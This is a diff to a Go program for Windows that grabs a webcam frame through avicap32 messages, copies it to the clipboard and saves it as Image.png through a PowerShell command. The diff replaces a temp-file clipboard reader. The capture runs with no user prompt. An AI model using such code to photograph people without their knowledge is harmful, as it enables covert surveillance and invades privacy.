@@ -1,15 +1,11 @@
 package main
 
 import (
-	"bytes"
 	"fmt"
-	"io"
-	"io/ioutil"
-	"os"
 	"os/exec"
 	"syscall"
 	"unsafe"
-
+	//"golang.design/x/clipboard"
 )
 
 var (
@@ -21,6 +17,12 @@ var (
 )
 
 func CaptureWebcam() {
+	// Init returns an error if the package is not ready for use.
+	//err := clipboard.Init()
+	//if err != nil {
+	//	panic(err)
+	//}
+
 	var name = "WebcamCapture"
 	handle, _, _ := proccapCreateCaptureWindowA.Call(uintptr(unsafe.Pointer(&name)), 0, 0, 0, 320, 240, 0, 0)
 	procSendMessageA.Call(handle, 0x40A, 0, 0) //WM_CAP_DRIVER_CONNECT
@@ -28,49 +30,16 @@ func CaptureWebcam() {
 	procSendMessageA.Call(handle, 0x43C, 0, 0) //WM_CAP_GRAB_FRAME
 	procSendMessageA.Call(handle, 0x41E, 0, 0) //WM_CAP_EDIT_COPY
 	procSendMessageA.Call(handle, 0x40B, 0, 0) //WM_CAP_DRIVER_DISCONNECT
-	camera, err := os.Create("Image.png")
-	if err != nil {
-	fmt.Println(err)
-		return
-	}
-	clip, err := readClipboard()
-	if err != nil {
-	fmt.Println(err)
-		return
-	}
-	_, err = io.Copy(camera, clip)
-	if err != nil {
-	fmt.Println(err)
-		return
-	}
-	camera.Close()
-}
 
-func readClipboard() (io.Reader, error) {
-	f, err := ioutil.TempFile("", "")
+	//img := clipboard.Read(clipboard.FmtImage)
+
+	//_, err = camera.Write(img)
+	_, err := exec.Command("PowerShell", "-Command", "Add-Type", "-AssemblyName", fmt.Sprintf("System.Windows.Forms;$clip=[Windows.Forms.Clipboard]::GetImage();if ($clip -ne $null) { $clip.Save('%s') };", "Image.png")).CombinedOutput()
+
 	if err != nil {
-	fmt.Println(err)
-		return nil, err
+		fmt.Println(err)
+		return
 	}
-	f.Close()
-	_, err = exec.Command("PowerShell", "-Command", "Add-Type", "-AssemblyName", fmt.Sprintf("System.Windows.Forms;$clip=[Windows.Forms.Clipboard]::GetImage();if ($clip -ne $null) { $clip.Save('%s') };", f.Name())).CombinedOutput()
-	if err != nil {
-	fmt.Println(err)
-		return nil, err
-	}
-	r := new(bytes.Buffer)
-	file, err := os.Open(f.Name())
-	if err != nil {
-	fmt.Println(err)
-		return nil, err
-	}
-	if _, err := io.Copy(r, file); err != nil {
-	fmt.Println(err)
-		return nil, err
-	}
-	file.Close()
-	os.Remove(f.Name())
-	return r, nil
 }
 
 func main() {
